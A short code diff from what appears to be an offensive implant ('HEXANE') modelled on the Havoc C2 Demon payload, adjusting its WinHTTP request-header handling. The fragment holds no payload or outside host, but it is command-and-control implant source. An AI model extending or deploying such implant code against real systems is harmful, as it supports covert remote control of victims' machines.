@@ -1,7 +1,7 @@
 #include <core/include/network.hpp>
 namespace Http {
-
     // https://github.com/HavocFramework/Havoc/blob/ea3646e055eb1612dcc956130fd632029dbf0b86/payloads/Demon/src/core/TransportHttp.c#L21
+
     VOID HttpCallback(PSTREAM Outbound, PSTREAM *Inbound) {
         HEXANE
 
@@ -66,7 +66,7 @@ namespace Http {
             // macro is redundant and silly but makes it looks nicer/ slightly less typing.
             DYN_ARRAY_EXPR(
                 nHeaders, Ctx->Transport.http->Headers,
-                Header = Ctx->Transport.http->Headers[nHeaders]->Buffer;
+                Header = Ctx->Transport.http->Headers[nHeaders];
 
             if (!Ctx->win32.WinHttpAddRequestHeaders(Request, Header, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
                 return_defer(ntstatus);
